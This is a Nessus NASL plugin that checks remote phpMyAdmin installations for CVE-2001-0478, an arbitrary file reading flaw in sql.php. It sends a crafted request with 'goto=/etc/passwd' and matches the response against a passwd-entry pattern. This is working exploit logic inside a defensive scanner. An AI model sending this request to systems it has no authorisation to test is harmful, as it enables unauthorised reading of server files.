#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
# Ref: http://www.securereality.com.au/archives/sradv00008.txt
#

if(description)
{
 script_id(11116);
 script_bugtraq_id(2642);
 script_version ("$Revision: 1.16 $");
 script_cve_id("CVE-2001-0478");
 name["english"] = "phpMyAdmin arbitrary files reading";

 script_name(english:name["english"]);
 
 desc["english"] = "
Synopsis : 

The remote web server contains a PHP script that is affected by a
local file inclusion flaw. 

Description :

It is possible to make the remote phpMyAdmin installation read
arbitrary data on the remote host.  An attacker may use this flaw to
read arbitrary files that your web server has the right to access or
execute arbitrary PHP code. 

See also :

http://archives.neohapsis.com/archives/bugtraq/2001-04/0396.html

Solution : 

Upgrade to phpMyAdmin 2.2.1 or newer

Risk factor : 

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of sql.php";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 - 2006 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2002 - 2006 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("phpMyAdmin_detect.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);



function check(dir, file)
{
 local_var req, r;

 req = http_get(item:string(dir, "/", file, "?server=000&cfgServers[000][host]=hello&btnDrop=No&goto=/etc/passwd"),
 		port:port);
 r = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 if( r == NULL ) exit(0);
 
 if(egrep(pattern:".*root:.*:.*:0:[01]:.*", string:r))
   {
 	security_warning(port);
	exit(0);
   }
}


# Test an install.
install = get_kb_item(string("www/", port, "/phpMyAdmin"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  check(dir:dir, file:"sql.php");
  check(dir:dir, file:"sql.php3");
}
